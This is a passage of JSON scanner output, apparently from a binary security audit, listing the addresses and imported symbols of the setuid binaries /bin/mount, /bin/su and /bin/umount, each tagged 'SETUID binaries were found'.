                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfa8",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfb0",
                        "mnt_context_get_status",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfb8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfc0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfc8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfd0",
                        "environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfd8",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfe0",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000e020",
                        "__progname",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000e028",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000e030",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000e040",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000e060",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011b98",
                        "endgrent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ba0",
                        "getenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ba8",
                        "sigprocmask",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bb0",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bb8",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bc0",
                        "strcasecmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bc8",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bd0",
                        "__vfprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bd8",
                        "abort",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011be0",
                        "pam_start",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011be8",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bf0",
                        "fdatasync",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bf8",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c00",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c08",
                        "_exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c10",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c18",
                        "pam_set_item",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c20",
                        "warn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c28",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c30",
                        "isatty",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c38",
                        "sigaction",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c40",
                        "strtod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c48",
                        "localeconv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c50",
                        "clock_gettime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c58",
                        "setenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c60",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c68",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c70",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c78",
                        "__strtol_internal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c80",
                        "__open_2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c88",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c90",
                        "wait3",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c98",
                        "getpwuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ca0",
                        "clearenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ca8",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cb0",
                        "stpcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cb8",
                        "pam_chauthtok",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cc0",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cc8",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cd0",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cd8",
                        "pam_end",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ce0",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ce8",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cf0",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cf8",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d00",
                        "pam_strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d08",
                        "errx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d10",
                        "dup2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d18",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d20",
                        "warnx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d28",
                        "nanosleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d30",
                        "dup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d38",
                        "gettimeofday",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d40",
                        "pam_getenvlist",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d48",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d50",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d58",
                        "__strtoul_internal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d60",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d68",
                        "setusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d70",
                        "signalfd",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d78",
                        "ioctl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d80",
                        "updwtmpx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d88",
                        "fgetc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d90",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d98",
                        "setgroups",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011da0",
                        "setsid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011da8",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011db0",
                        "misc_conv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011db8",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011dc0",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011dc8",
                        "getusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011dd0",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011dd8",
                        "strndup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011de0",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011de8",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011df0",
                        "putenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011df8",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e00",
                        "sigemptyset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e08",
                        "basename",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e10",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e18",
                        "sigfillset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e20",
                        "memcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e28",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e30",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e38",
                        "openpty",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e40",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e48",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e50",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e58",
                        "err",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e60",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e68",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e70",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e78",
                        "pam_close_session",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e80",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e88",
                        "getegid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e90",
                        "setreuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e98",
                        "strsignal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ea0",
                        "ttyname",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ea8",
                        "setregid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011eb0",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011eb8",
                        "cfmakeraw",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ec0",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ec8",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ed0",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ed8",
                        "poll",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ee0",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ee8",
                        "setgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ef0",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ef8",
                        "tcgetattr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f00",
                        "tcsetattr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f08",
                        "open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f10",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f18",
                        "dcngettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f20",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f28",
                        "execvp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f30",
                        "__cxa_atexit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f38",
                        "sysinfo",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f40",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f48",
                        "getgrnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f50",
                        "pam_acct_mgmt",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f58",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f60",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f68",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f70",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f78",
                        "pam_setcred",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f80",
                        "pam_authenticate",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f88",
                        "pam_open_session",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f90",
                        "initgroups",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f98",
                        "sleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fa0",
                        "endusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fa8",
                        "sigaddset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fb0",
                        "execv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fb8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fc0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fc8",
                        "__sprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fd0",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fd8",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fe0",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fe8",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ff0",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00012020",
                        "__progname",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00012028",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00012030",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00012040",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00012060",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c60",
                        "mnt_table_set_parser_errcb",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c68",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c70",
                        "mnt_context_is_restricted",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c78",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c80",
                        "mnt_unref_table",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c88",
                        "mnt_context_next_umount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c90",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c98",
                        "mnt_context_helper_executed",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ca0",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ca8",
                        "_exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cb0",
                        "secure_getenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cb8",
                        "mnt_context_enable_fake",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cc0",
                        "warn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cc8",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cd0",
                        "mnt_context_switch_ns",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cd8",
                        "mnt_table_next_fs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ce0",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ce8",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cf0",
                        "mnt_new_iter",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cf8",
                        "mnt_context_get_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d00",
                        "mnt_context_disable_swapmatch",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d08",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d10",
                        "mnt_context_find_umount_fs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d18",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d20",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d28",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d30",
                        "mnt_get_library_features",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d38",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d40",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d48",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d50",
                        "errx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d58",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d60",
                        "warnx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d68",
                        "mnt_context_force_unrestricted",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d70",
                        "mnt_context_umount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d78",
                        "nanosleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d80",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d88",
                        "mnt_new_table",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d90",
                        "dup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d98",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008da0",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008da8",
                        "mnt_context_disable_helpers",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008db0",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008db8",
                        "getcwd",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008dc0",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008dc8",
                        "mnt_context_set_tables_errcb",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008dd0",
                        "pipe",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008dd8",
                        "mnt_new_context",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008de0",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008de8",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008df0",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008df8",
                        "mnt_fs_get_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e00",
                        "mnt_context_switch_target_ns",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e08",
                        "mnt_fs_get_srcpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e10",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e18",
                        "memcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e20",
                        "mnt_context_enable_loopdel",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e28",
                        "mnt_context_tab_applied",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e30",
                        "prctl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e38",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e40",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e48",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e50",
                        "mnt_init_debug",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e58",
                        "mnt_context_syscall_called",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e60",
                        "err",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e68",
                        "mnt_context_set_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e70",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e78",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e80",
                        "mnt_context_get_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e88",
                        "mnt_context_get_excode",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e90",
                        "mnt_free_iter",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e98",
                        "mnt_context_is_verbose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ea0",
                        "mnt_context_set_target_ns",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ea8",
                        "getegid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008eb0",
                        "mnt_table_set_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008eb8",
                        "mnt_context_enable_lazy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ec0",
                        "mnt_table_find_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ec8",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ed0",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ed8",
                        "mnt_context_enable_force",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ee0",
                        "mnt_fs_get_devno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ee8",
                        "mnt_context_get_source",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ef0",
                        "mnt_get_library_version",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ef8",
                        "mnt_reset_context",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f00",
                        "memmove",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f08",
                        "setgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f10",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f18",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f20",
                        "mnt_context_enable_rdonly_umount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f28",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f30",
                        "mnt_context_set_options_pattern",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f38",
                        "mnt_free_context",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f40",
                        "mnt_context_disable_canonicalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f48",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f50",
                        "mnt_context_set_fstype_pattern",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f58",
                        "__cxa_atexit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f60",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f68",
                        "fwrite",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f70",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f78",
                        "mnt_context_enable_verbose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f80",
                        "mnt_table_next_child_fs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f88",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f90",
                        "mnt_context_disable_mtab",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f98",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fa0",
                        "mnt_table_parse_file",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fa8",
                        "mnt_tag_is_valid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fb0",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fb8",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fc0",
                        "mnt_context_get_status",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fc8",
                        "mnt_context_get_syscall_errno",
                        "SETUID binaries were found"
                     ],
                     [
